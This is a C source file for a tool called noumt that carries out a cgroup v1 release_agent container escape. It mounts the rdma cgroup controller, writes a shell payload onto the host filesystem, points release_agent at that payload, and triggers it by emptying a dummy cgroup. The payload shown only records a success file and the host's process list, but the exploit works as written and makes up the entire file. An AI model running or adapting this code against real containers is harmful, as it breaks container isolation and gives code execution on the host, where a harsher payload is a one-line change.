// File: noumt-src/noumt.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mount.h>
#include <sys/stat.h>

int main() {
    printf("[noumt] Starting cgroup release_agent container escape...\n");

    // --- Part 1: Prepare the cgroup filesystem ---
    char *cgroup_mount_path = "/tmp/cgrp";
    mkdir(cgroup_mount_path, 0755);

    // Mount the cgroup v1 filesystem (specifically the rdma controller, which is often available)
    if (mount("cgroup", cgroup_mount_path, "cgroup", 0, "rdma")) {
        perror("[-] Failed to mount cgroup");
        return 1;
    }
    printf("[+] Cgroup filesystem mounted at %s\n", cgroup_mount_path);
    
    // --- Part 2: Create malicious release_agent payload ---
    char *payload_path_on_host = "/host/tmp/escape_payload.sh";
    FILE *payload_file = fopen(payload_path_on_host, "w");
    if (!payload_file) {
        perror("[-] Failed to create payload file on host");
        return 1;
    }
    fprintf(payload_file, "#!/bin/sh\n");
    // This is the command that will run ON THE HOST.
    // We'll create a file to prove the escape worked.
    fprintf(payload_file, "echo 'Container escape successful at $(date)' > /tmp/ESCAPE_SUCCESSFUL\n");
    fprintf(payload_file, "ps aux > /tmp/HOST_PROCESSES.txt\n");
    fclose(payload_file);
    chmod(payload_path_on_host, 0777);
    printf("[+] Malicious payload written to %s\n", payload_path_on_host);

    // --- Part 3: Configure the release_agent ---
    char release_agent_path[256];
    // The path to our payload *as seen from the host's perspective*
    snprintf(release_agent_path, sizeof(release_agent_path), "/tmp/escape_payload.sh");

    char notify_on_release_path[256];
    snprintf(notify_on_release_path, sizeof(notify_on_release_path), "%s/notify_on_release", cgroup_mount_path);
    FILE *f_notify = fopen(notify_on_release_path, "w");
    if (!f_notify) {
        perror("[-] Failed to open notify_on_release");
        return 1;
    }
    fprintf(f_notify, "1");
    fclose(f_notify);

    char release_agent_config_path[256];
    snprintf(release_agent_config_path, sizeof(release_agent_config_path), "%s/release_agent", cgroup_mount_path);
    FILE *f_agent = fopen(release_agent_config_path, "w");
    if (!f_agent) {
        perror("[-] Failed to open release_agent");
        return 1;
    }
    fprintf(f_agent, "%s", release_agent_path);
    fclose(f_agent);
    printf("[+] Configured release_agent to execute our payload\n");

    // --- Part 4: Trigger the release_agent ---
    char dummy_cgroup_path[256];
    snprintf(dummy_cgroup_path, sizeof(dummy_cgroup_path), "%s/x", cgroup_mount_path);
    mkdir(dummy_cgroup_path, 0755);

    printf("[+] Triggering release_agent by running a process in a dummy cgroup...\n");
    // Fork a child process, add it to the dummy cgroup, and it will exit immediately.
    // When the last process exits, the cgroup becomes empty, triggering the agent.
    pid_t pid = fork();
    if (pid == 0) { // Child process
        char cgroup_procs_path[256];
        snprintf(cgroup_procs_path, sizeof(cgroup_procs_path), "%s/cgroup.procs", dummy_cgroup_path);
        FILE *f_procs = fopen(cgroup_procs_path, "w");
        if (!f_procs) {
            perror("[-] Child failed to open cgroup.procs");
            exit(1);
        }
        fprintf(f_procs, "%d", getpid());
        fclose(f_procs);
        exit(0); // Exit immediately to trigger release
    }
    
    // Give the kernel a moment to execute the agent
    sleep(2);
    printf("[+] Escape triggered. Check the host filesystem for /tmp/ESCAPE_SUCCESSFUL\n");

    return 0;
}
